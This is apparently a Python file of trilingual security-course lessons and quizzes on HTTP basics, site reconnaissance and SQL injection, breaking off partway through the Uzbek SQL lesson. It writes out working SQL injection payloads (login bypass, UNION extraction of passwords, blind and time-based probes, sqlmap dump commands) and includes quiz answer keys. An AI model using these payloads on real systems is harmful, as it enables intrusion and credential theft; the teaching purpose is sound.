"""
Module 03 — Web Application Security.

Payloads are shown against deliberately vulnerable targets you run yourself
(DVWA, Juice Shop, a local lab). Every attack here is illegal against a system
you do not own or have written authorisation to test; the material says so where
it matters, and the point is to understand the defect so you can fix it.
"""


def q(en, uz, ru, options, opts_uz, opts_ru, correct):
    return {
        "question": en, "questionUz": uz, "questionRu": ru,
        "options": options, "optionsUz": opts_uz, "optionsRu": opts_ru,
        "correctOption": correct,
    }


LESSONS = [
    # ---------------------------------------------------------------- 1
    {
        "category": "web", "points": 60,
        "title": "How a web application actually works",
        "titleUz": "Veb-ilova aslida qanday ishlaydi",
        "titleRu": "Как на самом деле работает веб-приложение",
        "content": r"""You cannot attack or defend what you cannot picture. Before any specific vulnerability, you need a clear mental model of what happens between typing a URL and seeing a page.

## The round trip

```
Browser  ──HTTP request──▶  Web server  ──▶  Application  ──▶  Database
   ▲                                                              │
   └──────────────  HTTP response  ◀──────────────────────────────┘
```

1. The browser sends an HTTP request.
2. A web server (nginx, Apache) receives it and hands it to the application.
3. The application code runs — checking who you are, reading input, deciding what to do.
4. It often queries a database.
5. It builds an HTML (or JSON) response and sends it back.

**Almost every web vulnerability is a failure at step 3 or 4:** input from step 1 is trusted when it should not be. Hold onto that sentence; it is the whole module in one line.

## Client side versus server side

This distinction decides what an attacker can touch.

- **Client side** runs in the browser: HTML, CSS, JavaScript. The user controls all of it completely. Anything enforced only here can be bypassed.
- **Server side** runs on the machine you do not control: the application code and database.

A "required" field, a disabled button, a hidden price, a length limit in JavaScript — all client side, all removable. The rule that follows is absolute: **never trust the client.** A check that matters must run on the server, because the server is the only part the user cannot rewrite.

You can prove this in ten seconds. Any client-side restriction can be skipped entirely by not using the browser:

```
$ curl -X POST http://localhost/api/order \
    -H "Content-Type: application/json" \
    -d '{"item":"laptop","price":1}'
```

The form said the price was fixed. `curl` never saw the form.

## State: HTTP has none

HTTP does not remember you between requests. Each one arrives as if it were the first. So how does a site keep you logged in? A **cookie**:

```
$ curl -i https://example.com/login -d "user=alice&pass=secret"
HTTP/2 200
set-cookie: session=8f3b2a9c1d...; HttpOnly; Secure; SameSite=Strict
```

The server stores who `8f3b2a9c...` is and hands you that token. Your browser returns it on every later request:

```
$ curl https://example.com/account -b "session=8f3b2a9c1d..."
```

That token *is* your identity to the server. Stealing it is stealing the session — which is exactly what several attacks in this module aim to do, and exactly what `HttpOnly` and `Secure` exist to prevent.

## Where the parameters live

Attacks target inputs, so you must know where inputs enter:

- **URL query string** — `?id=42&sort=name`, after the `?`
- **Path** — `/user/42/profile`, the `42` is a parameter too
- **POST body** — form fields or JSON, not shown in the URL
- **Headers** — `Cookie`, `User-Agent`, `Referer`, custom ones
- **Cookies** — sent automatically on every request

Every one of these is attacker-controlled. Every one has been the entry point for a real breach. A defender's job is to treat all of them as hostile until proven otherwise.

## Seeing it yourself

```
$ curl -v "http://localhost/search?q=test" 2>&1 | grep -E "^(>|<)"
> GET /search?q=test HTTP/1.1
> Host: localhost
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=UTF-8
```

The `q=test` you sent is now somewhere inside that application. What it does with it — put it in a database query, echo it into HTML, use it as a filename — is what the rest of this module is about.

## Try it

1. Open your browser's developer tools (F12), the Network tab, and load any site. Watch the requests.
2. In the same tools, find `document.cookie` in the console. What is stored?
3. Take a form on any test site and submit it with `curl` instead. What did the client-side validation actually protect?""",
        "contentUz": r"""Ko'z oldingizga keltira olmagan narsaga hujum ham qila olmaysiz, uni himoya ham. Har qanday aniq zaiflikdan oldin URL yozish bilan sahifani ko'rish orasida nima sodir bo'lishining aniq tasavvuri kerak.

## To'liq aylanish

```
Brauzer  ──HTTP so'rov──▶  Veb-server  ──▶  Ilova  ──▶  Ma'lumotlar bazasi
   ▲                                                          │
   └──────────────  HTTP javob  ◀───────────────────────────┘
```

1. Brauzer HTTP so'rov yuboradi.
2. Veb-server (nginx, Apache) uni qabul qilib, ilovaga topshiradi.
3. Ilova kodi ishlaydi — kimligingizni tekshiradi, kirishni o'qiydi, nima qilishni hal qiladi.
4. Ko'pincha ma'lumotlar bazasiga so'rov yuboradi.
5. HTML (yoki JSON) javob quradi va qaytaradi.

**Deyarli har bir veb-zaiflik 3 yoki 4-qadamdagi nosozlik:** 1-qadamdagi kirishga ishonmaslik kerak bo'lganda ishoniladi. Shu jumlani yodda tuting; butun modul bir satrda shu.

## Mijoz tomoni va server tomoni

Bu farq hujumchi nimaga tegishi mumkinligini hal qiladi.

- **Mijoz tomoni** brauzerda ishlaydi: HTML, CSS, JavaScript. Foydalanuvchi hammasini to'liq boshqaradi. Faqat shu yerda amalga oshirilgan har qanday narsani chetlab o'tish mumkin.
- **Server tomoni** siz boshqarmaydigan mashinada ishlaydi: ilova kodi va ma'lumotlar bazasi.

"Majburiy" maydon, o'chirilgan tugma, yashirin narx, JavaScript'dagi uzunlik chegarasi — hammasi mijoz tomonida, hammasini olib tashlash mumkin. Undan kelib chiqadigan qoida mutlaq: **hech qachon mijozga ishonmang.** Muhim tekshiruv serverda ishlashi kerak, chunki server — foydalanuvchi qayta yozа olmaydigan yagona qism.

Buni o'n soniyada isbotlashingiz mumkin. Har qanday mijoz tomonidagi cheklovni brauzerdan foydalanmaslik bilan butunlay o'tkazib yuborsa bo'ladi:

```
$ curl -X POST http://localhost/api/order \
    -H "Content-Type: application/json" \
    -d '{"item":"laptop","price":1}'
```

Forma narx belgilangan dedi. `curl` formani umuman ko'rmadi.

## Holat: HTTP'da yo'q

HTTP so'rovlar orasida sizni eslamaydi. Har biri xuddi birinchisidek keladi. Xo'sh, sayt sizni qanday tizimда saqlab turadi? **Cookie** orqali:

```
$ curl -i https://example.com/login -d "user=alice&pass=secret"
HTTP/2 200
set-cookie: session=8f3b2a9c1d...; HttpOnly; Secure; SameSite=Strict
```

Server `8f3b2a9c...` kimligini saqlaydi va sizga o'sha tokenni beradi. Brauzeringiz uni har keyingi so'rovda qaytaradi:

```
$ curl https://example.com/account -b "session=8f3b2a9c1d..."
```

O'sha token — server uchun *sizning shaxsingiz*. Uni o'g'irlash — sessiyani o'g'irlash, bu esa aynan shu moduldagi bir necha hujumning maqsadi va aynan `HttpOnly` va `Secure` oldini oladigan narsa.

## Parametrlar qayerda yashaydi

Hujumlar kirishlarni nishonga oladi, shuning uchun kirishlar qayerdan kirishini bilishingiz kerak:

- **URL so'rov satri** — `?id=42&sort=name`, `?` dan keyin
- **Yo'l** — `/user/42/profile`, `42` ham parametr
- **POST tanasi** — forma maydonlari yoki JSON, URL'da ko'rinmaydi
- **Sarlavhalar** — `Cookie`, `User-Agent`, `Referer`, maxsuslari
- **Cookie'lar** — har so'rovda avtomatik yuboriladi

Bularning har biri hujumchi tomonidan boshqariladi. Har biri haqiqiy buzilishning kirish nuqtasi bo'lgan. Himoyachining vazifasi — hammasini isbotlanmaguncha dushman deb hisoblash.

## O'zingiz ko'rish

```
$ curl -v "http://localhost/search?q=test" 2>&1 | grep -E "^(>|<)"
> GET /search?q=test HTTP/1.1
> Host: localhost
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=UTF-8
```

Siz yuborgan `q=test` endi o'sha ilova ichida qayerdadir. U bilan nima qilishi — bazaga so'rovga qo'yish, HTML'ga chiqarish, fayl nomi sifatida ishlatish — shu modulning qolgan qismi shu haqda.

## Sinab ko'ring

1. Brauzeringiz dasturchi vositalarini oching (F12), Network yorlig'ini va istalgan saytni yuklang. So'rovlarni kuzating.
2. O'sha vositalarda konsolda `document.cookie` ni toping. Nima saqlangan?
3. Istalgan test saytidagi formani brauzer o'rniga `curl` bilan yuboring. Mijoz tomonidagi tekshiruv aslida nimani himoya qilardi?""",
        "contentRu": r"""Нельзя атаковать или защищать то, что не можешь представить. До любой конкретной уязвимости нужна ясная модель того, что происходит между вводом URL и появлением страницы.

## Полный цикл

```
Браузер  ──HTTP-запрос──▶  Веб-сервер  ──▶  Приложение  ──▶  База данных
   ▲                                                            │
   └──────────────  HTTP-ответ  ◀──────────────────────────────┘
```

1. Браузер отправляет HTTP-запрос.
2. Веб-сервер (nginx, Apache) принимает его и передаёт приложению.
3. Работает код приложения — проверяет, кто вы, читает ввод, решает, что делать.
4. Часто обращается к базе данных.
5. Строит ответ HTML (или JSON) и отправляет обратно.

**Почти любая веб-уязвимость — сбой на шаге 3 или 4:** вводу с шага 1 доверяют там, где не следует. Запомните эту фразу; в ней весь модуль одной строкой.

## Клиент против сервера

Это различие определяет, до чего атакующий может дотянуться.

- **Клиентская сторона** работает в браузере: HTML, CSS, JavaScript. Пользователь полностью ею управляет. Всё, что проверяется только здесь, можно обойти.
- **Серверная сторона** работает на машине, которой вы не управляете: код приложения и база.

«Обязательное» поле, отключённая кнопка, скрытая цена, ограничение длины в JavaScript — всё клиентское, всё снимается. Отсюда абсолютное правило: **никогда не доверяйте клиенту.** Важная проверка должна выполняться на сервере, потому что сервер — единственная часть, которую пользователь не может переписать.

Это доказывается за десять секунд. Любое клиентское ограничение обходится полностью, просто не используя браузер:

```
$ curl -X POST http://localhost/api/order \
    -H "Content-Type: application/json" \
    -d '{"item":"laptop","price":1}'
```

Форма говорила, что цена фиксирована. `curl` формы вообще не видел.

## Состояние: у HTTP его нет

HTTP не помнит вас между запросами. Каждый приходит как первый. Как же сайт держит вас залогиненным? Через **cookie**:

```
$ curl -i https://example.com/login -d "user=alice&pass=secret"
HTTP/2 200
set-cookie: session=8f3b2a9c1d...; HttpOnly; Secure; SameSite=Strict
```

Сервер запоминает, кто такой `8f3b2a9c...`, и выдаёт вам этот токен. Браузер возвращает его в каждом следующем запросе:

```
$ curl https://example.com/account -b "session=8f3b2a9c1d..."
```

Этот токен *и есть* ваша личность для сервера. Украсть его — украсть сессию, а это ровно цель нескольких атак в этом модуле и ровно то, что предотвращают `HttpOnly` и `Secure`.

## Где живут параметры

Атаки целятся во ввод, поэтому надо знать, откуда ввод приходит:

- **Строка запроса URL** — `?id=42&sort=name`, после `?`
- **Путь** — `/user/42/profile`, `42` тоже параметр
- **Тело POST** — поля формы или JSON, в URL не видны
- **Заголовки** — `Cookie`, `User-Agent`, `Referer`, свои
- **Cookie** — уходят автоматически в каждом запросе

Каждый из них контролируется атакующим. Каждый был точкой входа реального взлома. Задача защитника — считать их всех враждебными, пока не доказано обратное.

## Увидеть самому

```
$ curl -v "http://localhost/search?q=test" 2>&1 | grep -E "^(>|<)"
> GET /search?q=test HTTP/1.1
> Host: localhost
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=UTF-8
```

Отправленный вами `q=test` теперь где-то внутри приложения. Что оно с ним делает — кладёт в запрос к базе, выводит в HTML, использует как имя файла — об этом весь остальной модуль.

## Попробуйте

1. Откройте инструменты разработчика (F12), вкладку Network и загрузите любой сайт. Смотрите запросы.
2. Там же в консоли найдите `document.cookie`. Что хранится?
3. Возьмите форму на любом тестовом сайте и отправьте её через `curl`. Что на самом деле защищала клиентская валидация?""",
        "questions": [
            q("Where must a security-critical check run?",
              "Xavfsizlik uchun muhim tekshiruv qayerda ishlashi kerak?",
              "Где должна выполняться критичная для безопасности проверка?",
              ["On the server", "In the browser's JavaScript", "In the HTML form", "In a cookie"],
              ["Serverda", "Brauzerning JavaScript'ida", "HTML formada", "Cookie ichida"],
              ["На сервере", "В JavaScript браузера", "В HTML-форме", "В cookie"], 0),
            q("How does a server recognise a logged-in user across stateless HTTP requests?",
              "Server holatsiz HTTP so'rovlar bo'ylab tizimga kirgan foydalanuvchini qanday taniydi?",
              "Как сервер узнаёт залогиненного пользователя между stateless HTTP-запросами?",
              ["A session token stored in a cookie", "The user's IP address",
               "The browser's User-Agent", "HTTP remembers the connection"],
              ["Cookie'da saqlangan sessiya tokeni orqali", "Foydalanuvchining IP manzili orqali",
               "Brauzerning User-Agent'i orqali", "HTTP ulanishni eslab qoladi"],
              ["Токеном сессии в cookie", "По IP-адресу пользователя",
               "По User-Agent браузера", "HTTP помнит соединение"], 0),
            q("A hidden price field in a form is enforced by:",
              "Formadagi yashirin narx maydoni qayerda amalga oshiriladi:",
              "Скрытое поле цены в форме обеспечивается:",
              ["Nothing reliable — the client can change it, so the server must re-check",
               "The browser, which cannot be bypassed", "The HTML standard",
               "The cookie's Secure flag"],
              ["Ishonchli hech narsa bilan emas — mijoz uni o'zgartira oladi, shuning uchun server qayta tekshirishi shart",
               "Chetlab o'tib bo'lmaydigan brauzer bilan", "HTML standarti bilan",
               "Cookie'ning Secure bayrog'i bilan"],
              ["Ничем надёжным — клиент может её изменить, поэтому сервер обязан перепроверить",
               "Браузером, который нельзя обойти", "Стандартом HTML",
               "Флагом Secure у cookie"], 0),
        ],
    },
    # ---------------------------------------------------------------- 2
    {
        "category": "web", "points": 70,
        "title": "Mapping an application before you touch it",
        "titleUz": "Ilovaga tegishdan oldin uni xaritalash",
        "titleRu": "Составление карты приложения до первого касания",
        "content": r"""Attacking blind wastes time and makes noise. Before any payload, you enumerate: find the pages, parameters, technologies and hidden paths. Most of a real assessment is this.

## Read what the server volunteers

The response headers alone give you the stack:

```
$ curl -sI https://target.local
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
Set-Cookie: PHPSESSID=abc...; path=/
```

`PHPSESSID` and `X-Powered-By` say PHP. `Server` names Apache and even the version. That is your research starting point before you send a single crafted request.

## The two files sites hand out for free

```
$ curl -s https://target.local/robots.txt
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /api/v1/internal/
```

`robots.txt` asks crawlers to skip paths — which conveniently *lists the paths worth looking at*. It is advice to robots, not a control; nothing stops you visiting `/admin/`.

```
$ curl -s https://target.local/sitemap.xml | grep -oE "<loc>[^<]+"
```

`sitemap.xml` lists pages the site wants indexed — a ready-made map.

## Fingerprinting the technology

`whatweb` names the stack in one command:

```
$ whatweb https://target.local
https://target.local [200 OK] Apache[2.4.41], Country[UNITED STATES],
HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], PHP[7.4.3],
WordPress[5.8], JQuery[3.5.1], X-Powered-By[PHP/7.4.3]
```

WordPress 5.8 with a known version turns "poke around" into "look up the advisories for exactly this".

## Finding hidden paths

Not everything is linked. Directory brute-forcing requests common names and keeps the ones that exist. `gobuster`:

```
$ gobuster dir -u https://target.local -w /usr/share/wordlists/dirb/common.txt
===============================================================
/admin                (Status: 301) [--> /admin/]
/backup               (Status: 200)
/login                (Status: 200)
/config.php           (Status: 200)
/.git                 (Status: 301) [--> /.git/]
===============================================================
```

Read the status codes as answers:

- **200** — it exists and is readable
- **301 / 302** — it exists and redirects (a `/admin` → `/admin/` redirect still confirms existence)
- **403** — it exists but is forbidden; existence alone is useful
- **404** — not there

An exposed `/.git` is a common jackpot: the whole source history, downloadable.

`ffuf` does the same, fast, and can fuzz any part of a request by putting `FUZZ` where the wordlist should go:

```
$ ffuf -u https://target.local/FUZZ -w common.txt -mc 200,301,403
```

`-mc` matches only those status codes, cutting the noise.

## Enumerating parameters

A page may accept parameters it never advertises. Fuzz the query key:

```
$ ffuf -u "https://target.local/page.php?FUZZ=test" -w params.txt -fs 4242
```

`-fs 4242` filters out the response size of a *wrong* parameter, so only parameters that change the page show up. A hidden `debug` or `admin` parameter surfaces exactly here.

## Do this politely and legally

Brute-forcing is loud and, against a system you are not authorised to test, illegal. Use `--delay`, keep wordlists sane, and only run it where you have permission — your own lab, or an engagement with a signed scope. Enumeration is where scope discipline starts, not where it is relaxed.

## Try it

Set up a local target (DVWA or OWASP Juice Shop in Docker) and against *that*:

1. `curl -sI` it — what stack do the headers reveal?
2. `gobuster dir` with `common.txt` — what paths exist that are not linked anywhere?
3. Fetch its `robots.txt` — what did it tell you not to look at?""",
        "contentUz": r"""Ko'r-ko'rona hujum vaqtni behuda sarflaydi va shovqin qiladi. Har qanday payload'dan oldin sanaysiz: sahifalar, parametrlar, texnologiyalar va yashirin yo'llarni topasiz. Haqiqiy baholashning aksari shu.

## Server o'zi bergan narsani o'qing

Yolg'iz javob sarlavhalari sizga texnologik to'plamni beradi:

```
$ curl -sI https://target.local
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
Set-Cookie: PHPSESSID=abc...; path=/
```

`PHPSESSID` va `X-Powered-By` PHP ekanini aytadi. `Server` Apache'ni, hatto versiyasini nomlaydi. Bu — bitta yasalgan so'rov yuborishdan oldingi tadqiqot boshlanish nuqtangiz.

## Saytlar bepul beradigan ikki fayl

```
$ curl -s https://target.local/robots.txt
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /api/v1/internal/
```

`robots.txt` kraulerlardan yo'llarni o'tkazib yuborishni so'raydi — bu esa qulay tarzda *qarashga arziydigan yo'llarni sanaydi*. Bu robotlarga maslahat, nazorat emas; sizni `/admin/` ga kirishdan hech narsa to'xtatmaydi.

```
$ curl -s https://target.local/sitemap.xml | grep -oE "<loc>[^<]+"
```

`sitemap.xml` sayt indekslashni xohlagan sahifalarni sanaydi — tayyor xarita.

## Texnologiyani aniqlash

`whatweb` to'plamni bitta buyruqda nomlaydi:

```
$ whatweb https://target.local
https://target.local [200 OK] Apache[2.4.41], Country[UNITED STATES],
HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], PHP[7.4.3],
WordPress[5.8], JQuery[3.5.1], X-Powered-By[PHP/7.4.3]
```

Ma'lum versiyali WordPress 5.8 "atrofni titkilash"ni "aynan shu versiyaga xabarnomalarni izlash"ga aylantiradi.

## Yashirin yo'llarni topish

Hamma narsa havola qilinmaydi. Katalogni brute-force qilish keng tarqalgan nomlarni so'raydi va mavjudlarini qoldiradi. `gobuster`:

```
$ gobuster dir -u https://target.local -w /usr/share/wordlists/dirb/common.txt
===============================================================
/admin                (Status: 301) [--> /admin/]
/backup               (Status: 200)
/login                (Status: 200)
/config.php           (Status: 200)
/.git                 (Status: 301) [--> /.git/]
===============================================================
```

Holat kodlarini javob sifatida o'qing:

- **200** — mavjud va o'qiladi
- **301 / 302** — mavjud va qayta yo'naltiradi (`/admin` → `/admin/` qayta yo'naltirishi ham mavjudlikni tasdiqlaydi)
- **403** — mavjud, lekin taqiqlangan; mavjudligining o'zi foydali
- **404** — yo'q

Ochilgan `/.git` — keng tarqalgan yutuq: butun manba tarixi, yuklab olsa bo'ladigan.

`ffuf` xuddi shuni tez qiladi va so'rovning istalgan qismini so'z ro'yxati o'rniga `FUZZ` qo'yish orqali fuzz qila oladi:

```
$ ffuf -u https://target.local/FUZZ -w common.txt -mc 200,301,403
```

`-mc` faqat o'sha holat kodlariga mos keladi va shovqinni kesadi.

## Parametrlarni sanash

Sahifa hech qachon e'lon qilmagan parametrlarni qabul qilishi mumkin. So'rov kalitini fuzz qiling:

```
$ ffuf -u "https://target.local/page.php?FUZZ=test" -w params.txt -fs 4242
```

`-fs 4242` *noto'g'ri* parametrning javob hajmini filtrlaydi, shunda faqat sahifani o'zgartiradigan parametrlar ko'rinadi. Yashirin `debug` yoki `admin` parametri aynan shu yerda paydo bo'ladi.

## Buni odob bilan va qonuniy qiling

Brute-force baland ovozli va sinash uchun vakolatingiz bo'lmagan tizimga qarshi noqonuniy. `--delay` ishlating, so'z ro'yxatlarini oqilona saqlang va faqat ruxsatingiz bor joyda — o'z laboratoriyangiz yoki imzolangan ko'lamli ishда yuriting. Sanash — ko'lam intizomi boshlanadigan joy, yumshaydigan joy emas.

## Sinab ko'ring

Mahalliy nishon o'rnating (Docker'da DVWA yoki OWASP Juice Shop) va *o'shanga* qarshi:

1. `curl -sI` — sarlavhalar qanday to'plamni oshkor qiladi?
2. `common.txt` bilan `gobuster dir` — hech qayerda havola qilinmagan qanday yo'llar mavjud?
3. Uning `robots.txt` ini oling — u sizga nimaga qaramaslikni aytdi?""",
        "contentRu": r"""Атаковать вслепую — терять время и шуметь. До любого пейлоада вы перечисляете: находите страницы, параметры, технологии и скрытые пути. Большая часть реальной оценки — именно это.

## Читайте, что сервер выдаёт сам

Одни заголовки ответа дают вам стек:

```
$ curl -sI https://target.local
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
Set-Cookie: PHPSESSID=abc...; path=/
```

`PHPSESSID` и `X-Powered-By` говорят о PHP. `Server` называет Apache и даже версию. Это отправная точка исследования ещё до первого крафтового запроса.

## Два файла, которые сайты отдают бесплатно

```
$ curl -s https://target.local/robots.txt
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /api/v1/internal/
```

`robots.txt` просит краулеров пропустить пути — и удобно *перечисляет пути, на которые стоит посмотреть*. Это совет роботам, не контроль; ничто не мешает вам зайти на `/admin/`.

```
$ curl -s https://target.local/sitemap.xml | grep -oE "<loc>[^<]+"
```

`sitemap.xml` перечисляет страницы, которые сайт хочет проиндексировать, — готовая карта.

## Отпечаток технологий

`whatweb` называет стек одной командой:

```
$ whatweb https://target.local
https://target.local [200 OK] Apache[2.4.41], Country[UNITED STATES],
HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], PHP[7.4.3],
WordPress[5.8], JQuery[3.5.1], X-Powered-By[PHP/7.4.3]
```

WordPress 5.8 с известной версией превращает «поковыряться» в «посмотреть advisory ровно под эту версию».

## Поиск скрытых путей

Не на всё есть ссылки. Перебор каталогов запрашивает частые имена и оставляет существующие. `gobuster`:

```
$ gobuster dir -u https://target.local -w /usr/share/wordlists/dirb/common.txt
===============================================================
/admin                (Status: 301) [--> /admin/]
/backup               (Status: 200)
/login                (Status: 200)
/config.php           (Status: 200)
/.git                 (Status: 301) [--> /.git/]
===============================================================
```

Читайте коды состояния как ответы:

- **200** — существует и читается
- **301 / 302** — существует и перенаправляет (редирект `/admin` → `/admin/` тоже подтверждает существование)
- **403** — существует, но запрещён; уже сам факт полезен
- **404** — нет

Открытый `/.git` — частый джекпот: вся история исходников, доступная для скачивания.

`ffuf` делает то же быстро и может фаззить любую часть запроса, подставляя `FUZZ` вместо словаря:

```
$ ffuf -u https://target.local/FUZZ -w common.txt -mc 200,301,403
```

`-mc` совпадает только с этими кодами, срезая шум.

## Перечисление параметров

Страница может принимать параметры, которые нигде не объявлены. Фаззьте ключ запроса:

```
$ ffuf -u "https://target.local/page.php?FUZZ=test" -w params.txt -fs 4242
```

`-fs 4242` отфильтровывает размер ответа для *неверного* параметра, оставляя только те, что меняют страницу. Скрытый `debug` или `admin` всплывает именно здесь.

## Делайте это вежливо и законно

Перебор шумен и, против системы без авторизации на тест, незаконен. Используйте `--delay`, держите словари в разумных пределах и запускайте только там, где есть разрешение — своя лаборатория или работа с подписанным scope. Перечисление — там, где начинается дисциплина области работ, а не ослабляется.

## Попробуйте

Поднимите локальную цель (DVWA или OWASP Juice Shop в Docker) и против *неё*:

1. `curl -sI` — какой стек выдают заголовки?
2. `gobuster dir` с `common.txt` — какие пути существуют, но нигде не связаны?
3. Заберите её `robots.txt` — на что он попросил не смотреть?""",
        "questions": [
            q("A gobuster result shows `/backup (Status: 403)`. What have you learned?",
              "gobuster natijasi `/backup (Status: 403)` ni ko'rsatdi. Nimani bildingiz?",
              "Результат gobuster показал `/backup (Status: 403)`. Что вы узнали?",
              ["The path exists but is forbidden", "The path does not exist",
               "The path is readable", "The server has crashed"],
              ["Yo'l mavjud, lekin taqiqlangan", "Yo'l mavjud emas",
               "Yo'l o'qiladi", "Server ishdan chiqqan"],
              ["Путь существует, но запрещён", "Пути не существует",
               "Путь читается", "Сервер упал"], 0),
            q("What does robots.txt actually provide to someone mapping a site?",
              "robots.txt saytni xaritalayotgan kishiga aslida nima beradi?",
              "Что robots.txt реально даёт тому, кто картирует сайт?",
              ["A convenient list of paths worth investigating", "A binding access control",
               "The server's source code", "A list of valid usernames"],
              ["Tekshirishga arziydigan yo'llarning qulay ro'yxatini", "Majburiy kirish nazoratini",
               "Serverning manba kodini", "Yaroqli foydalanuvchi nomlari ro'yxatini"],
              ["Удобный список путей, которые стоит изучить", "Обязательный контроль доступа",
               "Исходный код сервера", "Список валидных логинов"], 0),
            q("In ffuf, what does the `FUZZ` keyword do?",
              "ffuf'da `FUZZ` kalit so'zi nima qiladi?",
              "Что делает ключевое слово `FUZZ` в ffuf?",
              ["Marks where each wordlist entry is substituted into the request",
               "Enables verbose logging", "Adds a delay between requests",
               "Filters responses by status code"],
              ["So'rovda har bir so'z ro'yxati yozuvi qo'yiladigan joyni belgilaydi",
               "Batafsil loglashni yoqadi", "So'rovlar orasiga kechikish qo'shadi",
               "Javoblarni holat kodi bo'yicha filtrlaydi"],
              ["Отмечает, куда подставляется каждая запись словаря", "Включает подробный лог",
               "Добавляет задержку между запросами", "Фильтрует ответы по коду состояния"], 0),
        ],
    },
    # ---------------------------------------------------------------- 3
    {
        "category": "web", "points": 80,
        "title": "SQL injection: when input becomes a query",
        "titleUz": "SQL in'ektsiya: kirish so'rovga aylanganda",
        "titleRu": "SQL-инъекция: когда ввод становится запросом",
        "content": r"""SQL injection is the textbook example of the module's one sentence — trusting input — and still one of the most damaging web flaws. It happens when user input is glued into a database query as code instead of data.

## The defect

A login might build its query like this (pseudocode):

```
query = "SELECT * FROM users WHERE name = '" + input + "' AND pass = '" + pw + "'"
```

Enter a normal name and it works. Enter `' OR '1'='1` as the name and the query becomes:

```
SELECT * FROM users WHERE name = '' OR '1'='1' AND pass = '...'
```

`'1'='1'` is always true, so the `WHERE` matches every row. The database was asked a different question than the developer wrote — because the input was treated as SQL, not as a string.

## Finding it

The first probe is a single quote. If it breaks the query, the input reaches SQL unescaped:

```
$ curl "http://localhost/item.php?id=1'"
...
You have an error in your SQL syntax near ''1''' at line 1
```

That error message is a confirmed finding. Then test the classic pair:

```
?id=1 and 1=1     → normal page   (true condition)
?id=1 and 1=2     → empty/different page   (false condition)
```

If the page changes with the truth of a condition you control, you have injection even when no error is shown.

## UNION: reading other tables

When results are displayed, `UNION SELECT` appends rows from a query of your choosing. First find the column count with `ORDER BY`:

```
?id=1 order by 3     → works
?id=1 order by 4     → error   ⇒ there are 3 columns
```

Then pull real data:

```
?id=-1 union select 1,username,password from users
```

The `-1` makes the original query return nothing, so only your injected row shows. Databases carry a catalogue of their own structure, which tells you the table and column names to ask for:

```
?id=-1 union select 1,table_name,3 from information_schema.tables
?id=-1 union select 1,column_name,3 from information_schema.columns where table_name='users'
```

## Blind injection

Often nothing is displayed and no error leaks — but the page still behaves differently for true and false. You extract data one bit at a time:

```
?id=1 and substring((select password from users limit 1),1,1)='a'
```

True → normal page, false → different page. Automate over every position and character and the password falls out, slowly. A time-based variant asks the database to *sleep* when a guess is right:

```
?id=1 and if(substring(...,1,1)='a', sleep(3), 0)
```

A three-second delay means the guess was correct — data leaking through nothing but response time.

## sqlmap, and why you still learn the manual method

`sqlmap` automates all of the above:

```
$ sqlmap -u "http://localhost/item.php?id=1" --batch --dbs
$ sqlmap -u "http://localhost/item.php?id=1" -D shop --tables
$ sqlmap -u "http://localhost/item.php?id=1" -D shop -T users --dump
```

It is fast and thorough — but it only recognises what you can also spot by hand, and in a report you must explain *why* the injection works, which the tool will not do for you.

## The fix

Never build queries by concatenation. Use **parameterised queries** (prepared statements), where the query structure and the data travel separately and the data can never become code:

```
-- vulnerable
"SELECT * FROM users WHERE name = '" + input + "'"

-- safe: the driver sends structure and value apart
"SELECT * FROM users WHERE name = ?"   with input bound as a parameter
```

Input validation and least-privilege database accounts help, but parameterisation is the actual cure. If you write one defensive habit into muscle memory from this module, make it this one.

## Try it (on DVWA or a lab you own)

1. Submit `1'` to a numeric parameter. Does an SQL error appear?
2. Compare `1 and 1=1` with `1 and 1=2`. Does the page change?
3. Run `sqlmap -u "URL" --batch --dbs` against your lab, then reproduce one finding by hand.""",
        "contentUz": r"""SQL in'ektsiya — modulning bitta jumlasining darslik namunasi (kirishga ishonish) va hamon eng zararli veb-nuqsonlardan biri. U foydalanuvchi kirishi ma'lumot emas, kod sifatida bazaga so'rovga yopishtirilganda sodir bo'ladi.

## Nuqson

Kirish so'rovni shunday qurishi mumkin (psevdokod):

```
query = "SELECT * FROM users WHERE name = '" + input + "' AND pass = '" + pw + "'"
```

Oddiy nom kiriting — ishlaydi. Nom sifatida `' OR '1'='1` kiriting — so'rov shunday bo'ladi:

```
SELECT * FROM users WHERE name = '' OR '1'='1' AND pass = '...'
```

`'1'='1'` har doim rost, shuning uchun `WHERE` har bir qatorga mos keladi. Bazaga dasturchi yozgandan boshqa savol berildi — chunki kirish satr emas, SQL sifatida qabul qilindi.

## Topish

Birinchi zond — bitta tirnoq. Agar u so'rovni buzsa, kirish SQL'ga qochirilmasdan yetadi:

```
$ curl "http://localhost/item.php?id=1'"
...
You have an error in your SQL syntax near ''1''' at line 1
```

O'sha xato xabari — tasdiqlangan topilma. Keyin klassik juftlikni sinang:

```
?id=1 and 1=1     → oddiy sahifa   (rost shart)
?id=1 and 1=2     → bo'sh/boshqa sahifa   (yolg'on shart)
```

Agar sahifa siz boshqaradigan shartning rostligiga qarab o'zgarsa, xato ko'rsatilmasa ham sizda in'ektsiya bor.

## UNION: boshqa jadvallarni o'qish

Natijalar ko'rsatilganda `UNION SELECT` siz tanlagan so'rov qatorlarini qo'shadi. Avval `ORDER BY` bilan ustunlar sonini toping:

```
?id=1 order by 3     → ishlaydi
?id=1 order by 4     → xato   ⇒ 3 ta ustun bor
```

Keyin haqiqiy ma'lumotni torting:

```
?id=-1 union select 1,username,password from users
```

`-1` asl so'rovni hech narsa qaytarmaydigan qiladi, shunda faqat siz kiritgan qator ko'rinadi. Bazalar o'z tuzilishi katalogini olib yuradi, u sizga so'rash kerak bo'lgan jadval va ustun nomlarini aytadi:

```
?id=-1 union select 1,table_name,3 from information_schema.tables
?id=-1 union select 1,column_name,3 from information_schema.columns where table_name='users'
```

## Ko'r in'ektsiya

